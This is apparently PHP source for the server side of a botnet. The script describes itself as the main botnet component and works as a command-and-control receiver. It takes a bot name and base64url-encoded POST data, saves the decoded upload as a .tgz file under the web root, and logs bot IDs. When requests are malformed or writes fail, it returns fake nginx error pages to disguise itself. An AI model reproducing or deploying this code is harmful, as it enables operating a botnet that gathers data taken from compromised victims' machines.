<?php
	/*
		a.php - The main botnet component.
		---------------------------------
		This handles creating bot ID's as well as
		decoding the tar archives sent.
		
		/// NOTE ///
		As you can see, this is VERY noobish, please
		go easy on me, I'm not remotely good at php.
		/// END ///
	*/
    error_reporting(E_ERROR | E_PARSE); // No php errors, but I reccomend you turn it on for debugging ONLY.
	
    $botname = htmlspecialchars($_GET["name"]);
    $bot_data = str_replace(array(' ', '+'),array('-','_'), htmlspecialchars($_POST["data"]));
    $logpath = $_SERVER['DOCUMENT_ROOT']."/xml/logs"; // let's hardcode paths, because fuck it.
    $botpath = $_SERVER['DOCUMENT_ROOT']."/xml/bots";
    
    if(!$botname || !$bot_data) { // Die with a fake nginx message
    	echo "<html>\n";
		echo "<head><title>403 Forbidden</title></head>\n";
		echo "<body bgcolor=\"white\">\n";
		echo "<center><h1>404 Forbidden</h1></center>\n";
		echo "<hr><center>nginx/6.6.6 (Mac OS X)</center>\n";
		echo "</body>\n";
		echo "</html>\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		die("");
    }
    
    $bot_data_file = fopen($logpath . "/" . $botname . ".tgz", "w");
    if(!$bot_data_file) {
    	echo "<html>\n";
		echo "<head><title>503 Internal Server Error</title></head>\n";
		echo "<body bgcolor=\"white\">\n";
		echo "<center><h1>503 Internal Server Error</h1></center>\n";
		echo "<hr><center>nginx/6.6.6 (Mac OS X)</center>\n";
		echo "</body>\n";
		echo "</html>\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		die("");
    }
    
    fwrite($bot_data_file, base64url_decode($bot_data));
    fclose($bot_data_file);
    
    $botnamelog = fopen($botpath . "/" . $botname, "c");
	
    if(!$botnamelog) {
    	echo "<html>\n";
		echo "<head><title>504 Gateway Timeout</title></head>\n";
		echo "<body bgcolor=\"white\">\n";
		echo "<center><h1>504 Gateway Timeout</h1></center>\n";
		echo "<hr><center>nginx/6.6.6 (Mac OS X)</center>\n";
		echo "</body>\n";
		echo "</html>\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		die("");
    }
    fclose($botnamelog);

    $global = fopen($botpath . "/all", "c");
    if(!$global) {
    	echo "<html>\n";
		echo "<head><title>505 HTTP Version Not Supported</title></head>\n";
		echo "<body bgcolor=\"white\">\n";
		echo "<center><h1>505 HTTP Version Not Supported</h1></center>\n";
		echo "<hr><center>nginx/6.6.6 (Mac OS X)</center>\n";
		echo "</body>\n";
		echo "</html>\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		echo "<!-- a padding to disable MSIE and Chrome friendly error page -->\n";
		die("");
    }

    function base64url_decode($data) {
        return base64_decode(str_replace(array('-', '_'), array('+', '/'), $data));
    }
?>